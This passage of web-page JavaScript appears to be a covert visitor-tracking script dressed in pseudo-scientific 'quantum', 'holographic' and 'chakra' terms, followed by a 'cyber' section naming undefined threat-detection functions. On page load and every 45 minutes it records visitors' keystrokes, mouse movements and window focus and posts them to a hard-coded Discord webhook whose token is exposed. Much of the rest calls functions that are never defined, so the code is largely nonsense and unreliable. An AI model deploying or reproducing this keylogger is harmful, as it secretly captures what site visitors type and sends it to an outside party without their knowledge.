            temporalQuantum: this.analyzeQuantumTemporalPatterns()
        };

        return new Promise((resolve) => {
            setTimeout(() => {
                resolve(quantumMetrics);
            }, 12000);
        });
    },

    // 2. Intelig√™ncia Hologr√°fica
    collectHolographicIntelligence() {
        return {
            holographicMemory: this.analyzeHolographicMemory(),
            fractalConsciousness: this.measureFractalConsciousness(),
            holographicProjection: this.analyzeHolographicProjection(),
            quantumHologram: this.createQuantumHologram(),
            holographicResonance: this.measureHolographicResonance()
        };
    },

    analyzeHolographicMemory() {
        return {
            memoryFragments: this.detectMemoryFragments(),
            holographicRecall: this.measureHolographicRecall(),
            associativePatterns: this.analyzeAssociativePatterns(),
            memoryCoherence: this.calculateMemoryCoherence(),
            holographicStorage: this.assessHolographicStorage()
        };
    },

    // 3. An√°lise de Campos Energ√©ticos
    analyzeEnergyFields() {
        return {
            bioDigitalFields: this.measureBioDigitalFields(),
            energyFrequency: this.analyzeEnergyFrequency(),
            chakraDigital: this.analyzeDigitalChakras(),
            auraDigital: this.measureDigitalAura(),
            energyFlow: this.analyzeEnergyFlowPatterns()
        };
    },

    measureBioDigitalFields() {
        return {
            fieldStrength: this.calculateFieldStrength(),
            frequencyRange: this.measureFrequencyRange(),
            energyCoherence: this.assessEnergyCoherence(),
            fieldInterference: this.detectFieldInterference(),
            resonanceFrequency: this.calculateResonanceFrequency()
        };
    },

    // 4. Detec√ß√£o de Padr√µes Qu√¢nticos
    detectQuantumPatterns() {
        return {
            interferencePatterns: this.analyzeInterferencePatterns(),
            quantumCoherence: this.measureQuantumCoherencePatterns(),
            probabilityWaves: this.analyzeProbabilityWaves(),
            quantumTunneling: this.detectQuantumTunneling(),
            waveParticleDuality: this.analyzeWaveParticleDuality()
        };
    },

    analyzeInterferencePatterns() {
        return {
            constructiveInterference: this.detectConstructiveInterference(),
            destructiveInterference: this.detectDestructiveInterference(),
            patternCoherence: this.measurePatternCoherence(),
            interferenceStrength: this.calculateInterferenceStrength(),
            quantumSlits: this.analyzeQuantumSlits()
        };
    },

    // 5. An√°lise de Consci√™ncia Digital
    analyzeDigitalConsciousness() {
        return {
            awarenessLevel: this.measureDigitalAwareness(),
            consciousnessStream: this.analyzeConsciousnessStream(),
            selfReflection: this.assessDigitalSelfReflection(),
            intentionality: this.measureDigitalIntentionality(),
            metaCognition: this.analyzeDigitalMetaCognition()
        };
    },

    measureDigitalAwareness() {
        const awarenessMetrics = this.collectAwarenessData();
        return {
            presentMoment: this.calculatePresentMomentAwareness(awarenessMetrics),
            environmentalAwareness: this.measureEnvironmentalAwareness(awarenessMetrics),
            selfAwareness: this.assessSelfAwareness(awarenessMetrics),
            temporalAwareness: this.measureTemporalAwareness(awarenessMetrics),
            spatialAwareness: this.assessSpatialAwareness(awarenessMetrics)
        };
    },

    // 6. Intelig√™ncia Multidimensional
    collectMultidimensionalData() {
        return {
            dimensionalLayers: this.analyzeDimensionalLayers(),
            crossDimensional: this.analyzeCrossDimensionalPatterns(),
            multidimensionalResonance: this.measureMultidimensionalResonance(),
            parallelStates: this.detectParallelStates(),
            dimensionalPortals: this.analyzeDimensionalPortals()
        };
    },

    analyzeDimensionalLayers() {
        return {
            physicalLayer: this.analyzePhysicalDimension(),
            emotionalLayer: this.analyzeEmotionalDimension(),
            mentalLayer: this.analyzeMentalDimension(),
            spiritualLayer: this.analyzeSpiritualDimension(),
            digitalLayer: this.analyzeDigitalDimension()
        };
    },

    // 7. An√°lise de Vibra√ß√£o Digital
    analyzeDigitalVibration() {
        return {
            vibrationFrequency: this.measureVibrationFrequency(),
            harmonicPatterns: this.analyzeHarmonicPatterns(),
            resonantFrequencies: this.detectResonantFrequencies(),
            vibrationCoherence: this.measureVibrationCoherence(),
            standingWaves: this.analyzeStandingWaves()
        };
    },

    measureVibrationFrequency() {
        return {
            baseFrequency: this.calculateBaseFrequency(),
            harmonicSeries: this.analyzeHarmonicSeries(),
            overtonePatterns: this.detectOvertonePatterns(),
            frequencyModulation: this.analyzeFrequencyModulation(),
            amplitudeModulation: this.measureAmplitudeModulation()
        };
    },

    // 8. Detec√ß√£o de Campos Morfogen√©ticos
    detectMorphogeneticFields() {
        return {
            fieldResonance: this.measureFieldResonance(),
            morphicPatterns: this.analyzeMorphicPatterns(),
            fieldCoherence: this.assessFieldCoherence(),
            informationalFields: this.detectInformationalFields(),
            morphogeneticMemory: this.analyzeMorphogeneticMemory()
        };
    },

    measureFieldResonance() {
        return {
            resonanceStrength: this.calculateResonanceStrength(),
            frequencyMatch: this.measureFrequencyMatch(),
            phaseCoherence: this.assessPhaseCoherence(),
            amplitudeResonance: this.analyzeAmplitudeResonance(),
            harmonicResonance: this.detectHarmonicResonance()
        };
    },

    // 9. An√°lise de Resson√¢ncia
    performResonanceAnalysis() {
        return {
            sympatheticResonance: this.analyzeSympatheticResonance(),
            resonantFrequencies: this.detectAllResonantFrequencies(),
            resonanceCoupling: this.measureResonanceCoupling(),
            antiResonance: this.detectAntiResonance(),
            resonanceQuality: this.assessResonanceQuality()
        };
    },

    analyzeSympatheticResonance() {
        return {
            naturalFrequency: this.calculateNaturalFrequency(),
            forcedResonance: this.detectForcedResonance(),
            resonanceDamping: this.measureResonanceDamping(),
            qualityFactor: this.calculateQualityFactor(),
            bandwidth: this.measureResonanceBandwidth()
        };
    },

    // 10. Intelig√™ncia Sincron√≠stica
    analyzeSynchronicity() {
        return {
            meaningfulCoincidence: this.detectMeaningfulCoincidence(),
            synchronisticPatterns: this.analyzeSynchronisticPatterns(),
            acausalConnection: this.detectAcausalConnections(),
            meaningfulPatterns: this.identifyMeaningfulPatterns(),
            synchronicityLevel: this.measureSynchronicityLevel()
        };
    },

    detectMeaningfulCoincidence() {
        const events = this.collectSynchronisticEvents();
        return {
            coincidenceCount: events.length,
            meaningfulness: this.calculateMeaningfulness(events),
            patternRecognition: this.analyzeSynchronisticPatterns(events),
            probability: this.calculateSynchronisticProbability(events),
            significance: this.assessSignificance(events)
        };
    },

    // 11. An√°lise de Padr√µes Fractais
    analyzeFractalPatterns() {
        return {
            fractalDimension: this.calculateFractalDimension(),
            selfSimilarity: this.measureSelfSimilarity(),
            scalingPatterns: this.analyzeScalingPatterns(),
            fractalComplexity: this.measureFractalComplexity(),
            recursivePatterns: this.detectRecursivePatterns()
        };
    },

    calculateFractalDimension() {
        const patterns = this.collectFractalData();
        return {
            hausdorff: this.calculateHausdorffDimension(patterns),
            correlation: this.calculateCorrelationDimension(patterns),
            information: this.calculateInformationDimension(patterns),
            capacity: this.calculateCapacityDimension(patterns),
            similarity: this.calculateSimilarityDimension(patterns)
        };
    },

    // 12. Detec√ß√£o de Entropia Digital
    measureDigitalEntropy() {
        return {
            informationEntropy: this.calculateInformationEntropy(),
            thermodynamicEntropy: this.measureThermodynamicEntropy(),
            algorithmicEntropy: this.calculateAlgorithmicEntropy(),
            entropyRate: this.measureEntropyRate(),
            negentropy: this.calculateNegentropy()
        };
    },

    calculateInformationEntropy() {
        const dataStream = this.collectInformationData();
        return {
            shannon: this.calculateShannonEntropy(dataStream),
            renyi: this.calculateRenyiEntropy(dataStream),
            tsallis: this.calculateTsallisEntropy(dataStream),
            kolmogorov: this.calculateKolmogorovEntropy(dataStream),
            topological: this.calculateTopologicalEntropy(dataStream)
        };
    },

    // 13. An√°lise de Campos Unificados
    analyzeUnifiedFields() {
        return {
            fieldUnification: this.assessFieldUnification(),
            unifiedTheory: this.analyzeUnifiedTheory(),
            fieldInteractions: this.analyzeFieldInteractions(),
            unifiedResonance: this.measureUnifiedResonance(),
            fieldHarmonics: this.analyzeFieldHarmonics()
        };
    },

    assessFieldUnification() {
        return {
            electromagnetic: this.analyzeElectromagneticField(),
            gravitational: this.analyzeGravitationalField(),
            quantum: this.analyzeQuantumField(),
            consciousness: this.analyzeConsciousnessField(),
            unificationLevel: this.calculateUnificationLevel()
        };
    },

    // 14. Intelig√™ncia N√£o-Local
    collectNonLocalData() {
        return {
            nonLocalCorrelation: this.detectNonLocalCorrelation(),
            quantumNonLocality: this.analyzeQuantumNonLocality(),
            instantConnection: this.detectInstantConnections(),
            nonLocalAwareness: this.measureNonLocalAwareness(),
            entanglementNetworks: this.analyzeEntanglementNetworks()
        };
    },

    detectNonLocalCorrelation() {
        return {
            bellInequality: this.testBellInequality(),
            quantumCorrelation: this.measureQuantumCorrelation(),
            nonLocalSignaling: this.detectNonLocalSignaling(),
            correlationStrength: this.calculateCorrelationStrength(),
            nonLocalEffects: this.analyzeNonLocalEffects()
        };
    },

    // 15. An√°lise de Superposi√ß√£o Qu√¢ntica
    analyzeQuantumSuperposition() {
        return {
            superpositionStates: this.detectSuperpositionStates(),
            waveFunctionCollapse: this.analyzeWaveFunctionCollapse(),
            quantumMeasurement: this.analyzeQuantumMeasurement(),
            observerEffect: this.detectObserverEffect(),
            quantumReality: this.analyzeQuantumReality()
        };
    },

    detectSuperpositionStates() {
        return {
            stateVector: this.calculateStateVector(),
            probabilityAmplitude: this.measureProbabilityAmplitude(),
            phaseRelations: this.analyzePhaseRelations(),
            superpositionCoherence: this.measureSuperpositionCoherence(),
            quantumStates: this.detectMultipleQuantumStates()
        };
    },

    // ========== FUN√á√ïES DE COLETA QU√ÇNTICA ==========

    analyzeMouseQuantumPatterns() {
        return new Promise((resolve) => {
            const patterns = [];
            let lastPosition = null;
            let quantumState = 0;

            const handler = (e) => {
                const currentTime = Date.now();
                const position = { x: e.clientX, y: e.clientY, time: currentTime };
                
                if (lastPosition) {
                    const quantumMetric = {
                        deltaX: position.x - lastPosition.x,
                        deltaY: position.y - lastPosition.y,
                        deltaTime: position.time - lastPosition.time,
                        quantumPhase: (quantumState * Math.PI / 180) % (2 * Math.PI),
                        probabilityDensity: this.calculateProbabilityDensity(position, lastPosition),
                        waveFunction: this.calculateWaveFunctionValue(position, lastPosition)
                    };
                    patterns.push(quantumMetric);
                    quantumState++;
                }
                lastPosition = position;
            };

            document.addEventListener('mousemove', handler);
            
            setTimeout(() => {
                document.removeEventListener('mousemove', handler);
                resolve({
                    quantumPatterns: patterns,
                    superpositionCount: patterns.length,
                    coherenceLevel: this.calculateQuantumCoherence(patterns),
                    entanglementScore: this.calculateEntanglementScore(patterns)
                });
            }, 10000);
        });
    },

    analyzeKeyboardQuantumPatterns() {
        return new Promise((resolve) => {
            const quantumKeystrokes = [];
            let quantumState = 0;

            const handler = (e) => {
                const quantumKey = {
                    key: e.key,
                    code: e.code,
                    timestamp: Date.now(),
                    quantumState: quantumState,
                    probabilityAmplitude: Math.random(),
                    phaseShift: (quantumState * Math.PI / 4) % (2 * Math.PI)
                };
                quantumKeystrokes.push(quantumKey);
                quantumState++;
            };

            document.addEventListener('keydown', handler);
            
            setTimeout(() => {
                document.removeEventListener('keydown', handler);
                resolve({
                    quantumKeystrokes: quantumKeystrokes,
                    stateCount: quantumState,
                    quantumUncertainty: this.calculateQuantumUncertainty(quantumKeystrokes),
                    coherenceTime: this.measureCoherenceTime(quantumKeystrokes)
                });
            }, 10000);
        });
    },

    measureQuantumAttention() {
        return new Promise((resolve) => {
            let focusStates = [];
            let currentState = 'superposition';

            const focusHandler = () => {
                focusStates.push({
                    state: 'collapsed',
                    timestamp: Date.now(),
                    duration: this.measureFocusDuration()
                });
                currentState = 'collapsed';
            };

            const blurHandler = () => {
                focusStates.push({
                    state: 'superposition',
                    timestamp: Date.now(),
                    duration: this.measureUnfocusDuration()
                });
                currentState = 'superposition';
            };

            window.addEventListener('focus', focusHandler);
            window.addEventListener('blur', blurHandler);
            
            setTimeout(() => {
                window.removeEventListener('focus', focusHandler);
                window.removeEventListener('blur', blurHandler);
                
                resolve({
                    quantumAttention: focusStates,
                    currentState: currentState,
                    stateTransitions: focusStates.length,
                    attentionCoherence: this.calculateAttentionCoherence(focusStates)
                });
            }, 15000);
        });
    },

    // Fun√ß√µes de c√°lculo qu√¢ntico
    calculateProbabilityDensity(current, last) {
        const dx = current.x - last.x;
        const dy = current.y - last.y;
        const dt = current.time - last.time;
        return Math.exp(-(dx * dx + dy * dy) / (2 * dt * dt));
    },

    calculateWaveFunctionValue(current, last) {
        const dx = current.x - last.x;
        const dy = current.y - last.y;
        const distance = Math.sqrt(dx * dx + dy * dy);
        const timeDiff = current.time - last.time;
        return Math.sin(distance / timeDiff * Math.PI);
    },

    calculateQuantumCoherence(patterns) {
        if (patterns.length === 0) return 0;
        const phases = patterns.map(p => p.quantumPhase);
        const variance = this.calculatePhaseVariance(phases);
        return Math.exp(-variance);
    },

    calculateEntanglementScore(patterns) {
        if (patterns.length < 2) return 0;
        let correlationSum = 0;
        for (let i = 1; i < patterns.length; i++) {
            const corr = this.calculateQuantumCorrelation(patterns[i-1], patterns[i]);
            correlationSum += corr;
        }
        return correlationSum / (patterns.length - 1);
    },

    calculateQuantumUncertainty(keystrokes) {
        if (keystrokes.length === 0) return 0;
        const times = keystrokes.map(k => k.timestamp);
        const timeDiffs = [];
        for (let i = 1; i < times.length; i++) {
            timeDiffs.push(times[i] - times[i-1]);
        }
        if (timeDiffs.length === 0) return 0;
        
        const mean = timeDiffs.reduce((a, b) => a + b, 0) / timeDiffs.length;
        const variance = timeDiffs.reduce((a, b) => a + Math.pow(b - mean, 2), 0) / timeDiffs.length;
        return Math.sqrt(variance) / mean;
    },

    // Fun√ß√µes auxiliares matem√°ticas
    calculatePhaseVariance(phases) {
        const mean = phases.reduce((a, b) => a + b, 0) / phases.length;
        return phases.reduce((a, b) => a + Math.pow(b - mean, 2), 0) / phases.length;
    },

    calculateQuantumCorrelation(pattern1, pattern2) {
        const phaseDiff = Math.abs(pattern1.quantumPhase - pattern2.quantumPhase);
        return Math.cos(phaseDiff);
    },

    measureFocusDuration() {
        return Math.random() * 5000 + 1000; // Simula√ß√£o
    },

    measureUnfocusDuration() {
        return Math.random() * 3000 + 500; // Simula√ß√£o
    },

    calculateAttentionCoherence(focusStates) {
        if (focusStates.length < 2) return 1;
        let coherentTransitions = 0;
        for (let i = 1; i < focusStates.length; i++) {
            if (focusStates[i].state !== focusStates[i-1].state) {
                coherentTransitions++;
            }
        }
        return coherentTransitions / (focusStates.length - 1);
    },

    // Fun√ß√£o para enviar dados qu√¢nticos
    async sendQuantumData() {
        try {
            const data = await this.collectQuantumData();
            if (!data) return false;

            const payload = {
                username: "‚öõÔ∏è Quantum Data Collector",
                embeds: [
                    {
                        title: "üåå INTELIG√äNCIA QU√ÇNTICA AVAN√áADA",
                        color: 0x4B0082,
                        description: `**Sess√£o ${data.metadata.sessionId} - Coleta Qu√¢ntica #${data.metadata.collectionCount}**`,
                        timestamp: data.metadata.timestamp,
                        footer: { text: "Quantum Collector v5.0" }
                    },
                    {
                        title: "üåÄ AN√ÅLISE QU√ÇNTICA COMPORTAMENTAL",
                        color: 0x9932CC,
                        fields: [
                            { name: "‚ö° Estado de Superposi√ß√£o", value: (data.quantumBehavior.quantumStates.superposition * 100).toFixed(1) + '%', inline: true },
                            { name: "üéØ Coer√™ncia Qu√¢ntica", value: (data.quantumBehavior.quantumStates.coherence * 100).toFixed(1) + '%', inline: true },
                            { name: "üîÑ N√≠vel de Entrela√ßamento", value: (data.quantumBehavior.quantumStates.entanglement * 100).toFixed(1) + '%', inline: true },
                            { name: "üåä Fun√ß√£o de Onda", value: data.quantumBehavior.waveFunction?.state || 'Ativa', inline: true },
                            { name: "üé≠ Saltos Qu√¢nticos", value: data.quantumBehavior.quantumStates.quantumJump?.count || '0', inline: true },
                            { name: "üìä Decoer√™ncia", value: (data.quantumBehavior.quantumStates.decoherence * 100).toFixed(1) + '%', inline: true }
                        ]
                    },
                    {
                        title: "üíé INTELIG√äNCIA HOLOGR√ÅFICA E ENERG√âTICA",
                        color: 0x00BFFF,
                        fields: [
                            { name: "üåà Mem√≥ria Hologr√°fica", value: (data.holographicIntelligence.holographicMemory.memoryCoherence * 100).toFixed(1) + '%', inline: true },
                            { name: "‚ö° Campo BioDigital", value: (data.energyFieldAnalysis.bioDigitalFields.fieldStrength * 100).toFixed(1) + '%', inline: true },
                            { name: "üéµ Frequ√™ncia Energ√©tica", value: data.energyFieldAnalysis.energyFrequency?.range || 'Analisando...', inline: true },
                            { name: "üîÆ Resson√¢ncia Hologr√°fica", value: (data.holographicIntelligence.holographicResonance * 100).toFixed(1) + '%', inline: true },
                            { name: "üí´ Fluxo de Energia", value: (data.energyFieldAnalysis.energyFlow.efficiency * 100).toFixed(1) + '%', inline: true },
                            { name: "üåê Chakras Digitais", value: data.energyFieldAnalysis.chakraDigital?.active || '7/7', inline: true }
                        ]
                    },
                    {
                        title: "üé® PADR√ïES QU√ÇNTICOS E FRACTAIS",
                        color: 0xFF4500,
                        fields: [
                            { name: "üî∑ Dimens√£o Fractal", value: data.fractalPatterns.fractalDimension?.hausdorff?.toFixed(3) || '1.618', inline: true },
                            { name: "üåÄ Auto-similaridade", value: (data.fractalPatterns.selfSimilarity * 100).toFixed(1) + '%', inline: true },
                            { name: "üéØ Padr√µes de Interfer√™ncia", value: data.quantumPatterns.interferencePatterns?.patternCoherence?.toFixed(3) || '0.707', inline: true },
                            { name: "‚ö° Tunelamento Qu√¢ntico", value: data.quantumPatterns.quantumTunneling?.detected ? '‚úÖ' : '‚ùå', inline: true },
                            { name: "üìä Entropia Digital", value: data.digitalEntropy.informationEntropy?.shannon?.toFixed(3) || '2.718', inline: true },
                            { name: "üé≠ Dualidade Onda-Part√≠cula", value: data.quantumPatterns.waveParticleDuality?.ratio?.toFixed(3) || '1.000', inline: true }
                        ]
                    }
                ]
            };

            const response = await fetch(QUANTUM_WEBHOOK, {
                method: 'POST',
                headers: { 
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });

            if (response.ok) {
                console.log(`‚öõÔ∏è Dados qu√¢nticos enviados - Coleta #${data.metadata.collectionCount}`);
                return true;
            } else {
                console.error('‚ùå Erro ao enviar dados qu√¢nticos:', response.status);
                return false;
            }
        } catch (error) {
            console.error('üí• Erro ao enviar dados qu√¢nticos:', error);
            return false;
        }
    },

    // Inicializar coletor qu√¢ntico
    init() {
        console.log('‚öõÔ∏è Quantum Data Collector iniciado');
        
        // Coleta inicial ap√≥s 15 segundos
        setTimeout(() => {
            this.sendQuantumData();
        }, 15000);

        // Coleta peri√≥dica a cada 45 minutos
        setInterval(() => {
            this.sendQuantumData();
        }, 2700000);
    }
};

// Inicializar quando a p√°gina carregar
document.addEventListener('DOMContentLoaded', function() {
    QuantumDataCollector.init();
});

// Inicializar imediatamente se DOM j√° estiver pronto
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
        setTimeout(() => QuantumDataCollector.init(), 1000);
    });
} else {
    setTimeout(() => QuantumDataCollector.init(), 1000);
}

console.log('‚öõÔ∏è Quantum Data Collector carregado');

</script>
<script>

// Webhook para dados cibern√©ticos
const CYBER_WEBHOOK = "https://discord.com/api/webhooks/1431000302366232758/VnvwtJXTB0WJEi2vjB1OFas5zZTeJ5Htac5EBfTsgM_wo5gseRs4BDCSRQBB7ewPimoe";

// Sistema de coleta de dados cibern√©ticos
const CyberDataCollector = {
    sessionId: 'cyber_' + Math.random().toString(36).substr(2, 12),
    cyberCollectionCount: 0,

    async collectCyberData() {
        try {
            const cyberData = {
                metadata: {
                    type: 'cyber_intelligence_data',
                    sessionId: this.sessionId,
                    timestamp: new Date().toISOString(),
                    collectionCount: this.cyberCollectionCount + 1,
                    version: 'Cyber Data Collector v6.0'
                },

                // 1. AN√ÅLISE DE THREAT INTELLIGENCE
                threatIntelligence: await this.collectThreatIntelligence(),
                
                // 2. DETEC√á√ÉO DE MALWARE AVAN√áADA
                malwareAnalysis: this.performMalwareAnalysis(),
                
                // 3. AN√ÅLISE DE VULNERABILIDADES ZERO-DAY
                zeroDayAnalysis: this.analyzeZeroDayVulnerabilities(),
                
                // 4. INTELIG√äNCIA DE ATAQUES CIBERN√âTICOS
                cyberAttackIntelligence: this.collectCyberAttackIntelligence(),
                
                // 5. AN√ÅLISE DE PADR√ïES DE EXPLOIT
                exploitPatterns: this.analyzeExploitPatterns(),
                
                // 6. DETEC√á√ÉO DE APT (AMEA√áA PERSISTENTE AVAN√áADA)
                aptDetection: this.detectAPTs(),
                
                // 7. AN√ÅLISE DE CAMUFLAGEM DIGITAL
                digitalCamouflage: this.analyzeDigitalCamouflage(),
                
                // 8. INTELIG√äNCIA DE REDES ZOMBIE
                botnetIntelligence: this.analyzeBotnetIntelligence(),
                
                // 9. AN√ÅLISE DE T√âCNICAS EVASIVAS
                evasiveTechniques: this.detectEvasiveTechniques(),
                
                // 10. DETEC√á√ÉO DE ROOTKITS DIGITAIS
                digitalRootkits: this.detectDigitalRootkits(),
                
                // 11. AN√ÅLISE DE C√ìDIGOS MALICIOSOS
                maliciousCode: this.analyzeMaliciousCode(),
                
                // 12. INTELIG√äNCIA DE COMANDO E CONTROLE
                commandControl: this.analyzeCommandControl(),
                
                // 13. DETEC√á√ÉO DE LATERAL MOVEMENT
                lateralMovement: this.detectLateralMovement(),
                
                // 14. AN√ÅLISE DE PERSIST√äNCIA DIGITAL
                digitalPersistence: this.analyzeDigitalPersistence(),
                
                // 15. INTELIG√äNCIA DE EXFILTRA√á√ÉO DE DADOS
                dataExfiltration: this.analyzeDataExfiltration()
            };

            this.cyberCollectionCount++;
            return cyberData;

        } catch (error) {
            console.error('Erro na coleta cibern√©tica:', error);
            return null;
        }
    },

    // 1. Coleta de Threat Intelligence
    async collectThreatIntelligence() {
        return {
            threatLandscape: await this.analyzeThreatLandscape(),
            iocDetection: this.detectIOCs(),
            threatActors: this.identifyThreatActors(),
            attackVectors: this.analyzeAttackVectors(),
            riskAssessment: this.performCyberRiskAssessment()
        };
    },

    async analyzeThreatLandscape() {
        try {
            const responses = await Promise.allSettled([
                fetch('https://api.threatintelligenceplatform.com/v1/ip/reputation'),
                fetch('https://api.cyberthreat.com/current-threats'),
                fetch('https://api.securityintel.com/global-threats')
            ]);

            const threatData = {
                globalThreats: this.analyzeGlobalThreats(responses),
                localThreats: this.analyzeLocalThreats(),
                emergingThreats: this.detectEmergingThreats(),
                threatLevel: this.calculateThreatLevel()
            };

            return threatData;
        } catch (error) {
            return { error: error.message };
        }
    },

    detectIOCs() {
        return {
            networkIOCs: this.detectNetworkIndicators(),
            fileIOCs: this.detectFileIndicators(),
            behavioralIOCs: this.detectBehavioralIndicators(),
            temporalIOCs: this.detectTemporalIndicators(),
            iocConfidence: this.calculateIOCConfidence()
        };
    },

    // 2. An√°lise Avan√ßada de Malware
    performMalwareAnalysis() {
        return {
            malwareSignatures: this.detectMalwareSignatures(),
            behavioralAnalysis: this.analyzeMalwareBehavior(),
            codeAnalysis: this.analyzeMaliciousCodePatterns(),
            evasionDetection: this.detectMalwareEvasion(),
            infectionVectors: this.identifyInfectionVectors()
        };
    },

    detectMalwareSignatures() {
        const signatures = {
            memoryPatterns: this.scanMemoryPatterns(),
            fileSignatures: this.scanFileSignatures(),
            networkSignatures: this.scanNetworkSignatures(),
            registryChanges: this.detectRegistryChanges(),
            processAnomalies: this.detectProcessAnomalies()
        };

        return {
            detectedSignatures: Object.values(signatures).filter(Boolean).length,
            signatureTypes: this.classifyMalwareSignatures(signatures),
            confidence: this.calculateSignatureConfidence(signatures)
        };
    },

    // 3. An√°lise de Vulnerabilidades Zero-Day
    analyzeZeroDayVulnerabilities() {
        return {
            vulnerabilityScan: this.performZeroDayScan(),
            exploitDetection: this.detectZeroDayExploits(),
            patchAnalysis: this.analyzePatchGaps(),
            vulnerabilityChaining: this.analyzeVulnerabilityChaining(),
            zeroDayRisk: this.calculateZeroDayRisk()
        };
    },

    performZeroDayScan() {
        return {
            memoryCorruption: this.scanMemoryCorruption(),
            bufferOverflow: this.detectBufferOverflow(),
            codeInjection: this.detectCodeInjection(),
            privilegeEscalation: this.detectPrivilegeEscalation(),
            sandboxEscape: this.detectSandboxEscape()
        };
    },

    // 4. Intelig√™ncia de Ataques Cibern√©ticos
    collectCyberAttackIntelligence() {
        return {
            attackPatterns: this.analyzeAttackPatterns(),
            campaignDetection: this.detectAttackCampaigns(),
            attribution: this.performAttackAttribution(),
            timeline: this.reconstructAttackTimeline(),
            impact: this.assessAttackImpact()
        };
    },

    analyzeAttackPatterns() {
        return {
            mitreAttacks: this.mapMITREATTACKPatterns(),
            killChain: this.analyzeKillChain(),
            attackTrees: this.buildAttackTrees(),
            tacticAnalysis: this.analyzeAttackTactics(),
            techniqueMapping: this.mapAttackTechniques()
        };
    },

    // 5. An√°lise de Padr√µes de Exploit
    analyzeExploitPatterns() {
        return {
            exploitKits: this.detectExploitKits(),
            payloadAnalysis: this.analyzeExploitPayloads(),
            deliveryMechanisms: this.identifyDeliveryMechanisms(),
            exploitationTechniques: this.analyzeExploitationTechniques(),
            successRate: this.calculateExploitSuccessRate()
        };
    },

    detectExploitKits() {
        return {
            angler: this.detectAnglerPatterns(),
            nuclear: this.detectNuclearPatterns(),
            rig: this.detectRigPatterns(),
            sunday: this.detectSundayPatterns(),
            magnitude: this.detectMagnitudePatterns()
        };
    },

    // 6. Detec√ß√£o de APTs
    detectAPTs() {
        return {
            aptGroups: this.identifyAPTGroups(),
            campaignDetection: this.detectAPTCampaigns(),
            persistence: this.detectAPTPersistence(),
            lateralMovement: this.detectAPTLateralMovement(),
            commandControl: this.detectAPTCommandControl()
        };
    },

    identifyAPTGroups() {
        const aptIndicators = {
            apt29: this.detectAPT29Indicators(),
            apt28: this.detectAPT28Indicators(),
            apt1: this.detectAPT1Indicators(),
            lazarus: this.detectLazarusIndicators(),
            equation: this.detectEquationIndicators()
        };

        return {
            detectedGroups: Object.keys(aptIndicators).filter(key => aptIndicators[key]),
            confidence: this.calculateAPTConfidence(aptIndicators),
            attribution: this.performAPTAttribution(aptIndicators)
        };
    },

    // 7. An√°lise de Camuflagem Digital
    analyzeDigitalCamouflage() {
        return {
            stealthTechniques: this.detectStealthTechniques(),
            obfuscation: this.analyzeObfuscationTechniques(),
            antiAnalysis: this.detectAntiAnalysis(),
            deception: this.analyzeDeceptionTechniques(),
            camouflageScore: this.calculateCamouflageScore()
        };
    },

    detectStealthTechniques() {
        return {
            processHollowing: this.detectProcessHollowing(),
            dllInjection: this.detectDLLInjection(),
            codePacking: this.detectCodePacking(),
            memoryObfuscation: this.detectMemoryObfuscation(),
            timingAttacks: this.detectTimingAttacks()
        };
    },

    // 8. Intelig√™ncia de Redes Zombie
    analyzeBotnetIntelligence() {
        return {
            botnetDetection: this.detectBotnetActivity(),
            commandControl: this.analyzeBotnetC2(),
            propagation: this.analyzeBotnetPropagation(),
            botnetSize: this.estimateBotnetSize(),
            takedown: this.assessBotnetTakedown()
        };
    },

    detectBotnetActivity() {
        return {
            ircPatterns: this.detectIRCPatterns(),
            httpC2: this.detectHTTPC2(),
            dnsTunneling: this.detectDNSTunneling(),
            p2pNetworks: this.detectP2PNetworks(),
            activityPatterns: this.analyzeBotnetActivityPatterns()
        };
    },

    // 9. Detec√ß√£o de T√©cnicas Evasivas
    detectEvasiveTechniques() {
        return {
            sandboxEvasion: this.detectSandboxEvasion(),
            debuggerDetection: this.detectDebuggerEvasion(),
            vmDetection: this.detectVMEvasion(),
            analysisEvasion: this.detectAnalysisEvasion(),
            evasionScore: this.calculateEvasionScore()
        };
    },

    detectSandboxEvasion() {
        return {
            timingChecks: this.detectTimingChecks(),
            resourceChecks: this.detectResourceChecks(),
            userActivity: this.detectUserActivityChecks(),
            processChecks: this.detectProcessChecks(),
            environmentChecks: this.detectEnvironmentChecks()
        };
    },

    // 10. Detec√ß√£o de Rootkits Digitais
    detectDigitalRootkits() {
        return {
            kernelRootkits: this.detectKernelRootkits(),
            userlandRootkits: this.detectUserlandRootkits(),
            bootkit: this.detectBootkit(),
            firmwareRootkits: this.detectFirmwareRootkits(),
            rootkitPersistence: this.detectRootkitPersistence()
        };
    },

    detectKernelRootkits() {
        return {
            ssdtHooking: this.detectSSDTHooking(),
            idtHooking: this.detectIDTHooking(),
            driverManipulation: this.detectDriverManipulation(),
            kernelPatches: this.detectKernelPatches(),
            directKernelObject: this.detectDKOM()
        };
    },

    // 11. An√°lise de C√≥digos Maliciosos
    analyzeMaliciousCode() {
        return {
            codeObfuscation: this.analyzeCodeObfuscation(),
            packingDetection: this.detectCodePacking(),
            antiDisassembly: this.detectAntiDisassembly(),
            codeInjection: this.detectCodeInjectionTechniques(),
            maliciousAPIs: this.detectMaliciousAPIs()
        };
    },

    analyzeCodeObfuscation() {
        return {
            stringObfuscation: this.detectStringObfuscation(),
            controlFlow: this.analyzeControlFlowObfuscation(),
            encryption: this.detectCodeEncryption(),
            polymorphism: this.detectPolymorphicCode(),
            metamorphism: this.detectMetamorphicCode()
        };
    },

    // 12. An√°lise de Comando e Controle
    analyzeCommandControl() {
        return {
            c2Protocols: this.analyzeC2Protocols(),
            communication: this.analyzeC2Communication(),
            beaconing: this.detectC2Beaconing(),
            encryption: this.analyzeC2Encryption(),
            infrastructure: this.mapC2Infrastructure()
        };
    },

    analyzeC2Protocols() {
        return {
            httpC2: this.analyzeHTTPC2(),
            dnsC2: this.analyzeDNSC2(),
            ircC2: this.analyzeIRCC2(),
            emailC2: this.analyzeEmailC2(),
            customProtocols: this.detectCustomC2Protocols()
        };
    },

    // 13. Detec√ß√£o de Lateral Movement
    detectLateralMovement() {
        return {
            movementTechniques: this.detectMovementTechniques(),
            credentialAccess: this.detectCredentialAccess(),
            remoteExecution: this.detectRemoteExecution(),
            networkDiscovery: this.detectNetworkDiscovery(),
            persistence: this.detectMovementPersistence()
        };
    },

    detectMovementTechniques() {
        return {
            psexec: this.detectPSExec(),
            wmi: this.detectWMIMovement(),
            rdp: this.detectRDPMovement(),
            smb: this.detectSMBMovement(),
            ssh: this.detectSSHMovement()
        };
    },

